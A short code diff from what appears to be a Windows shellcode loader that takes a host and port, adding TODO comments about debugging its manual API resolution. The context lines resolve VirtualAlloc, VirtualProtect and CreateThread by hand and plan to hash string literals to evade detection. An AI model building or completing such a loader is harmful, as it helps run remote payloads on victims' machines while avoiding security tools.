@@ -27,7 +27,7 @@
 //#include <stdlib.h>
 
 
-
+// TODO: GetProcAddress is not working... fix it
 
 
 //#pragma comment(lib, "ws2_32.lib")
@@ -38,6 +38,7 @@ int run(const char* host, const char* port)
     // 1. manually resolve apis (skip for now and just include the headers that import it)
 
 	// TODO: hash these string literals 
+    // TODO: maybe try using regular GetProcAddress to see if everything works then try to use GetProcAddressManual
     FuncVirtualAlloc pVirtualAlloc = (FuncVirtualAlloc)GetProcAddressManual("kernel32.dll", "VirtualAlloc");
     FuncVirtualProtect pVirtualProtect = (FuncVirtualProtect)GetProcAddressManual("kernel32.dll", "VirtualProtect");
     FuncCreateThread pCreateThread = (FuncCreateThread)GetProcAddressManual("kernel32.dll", "CreateThread");
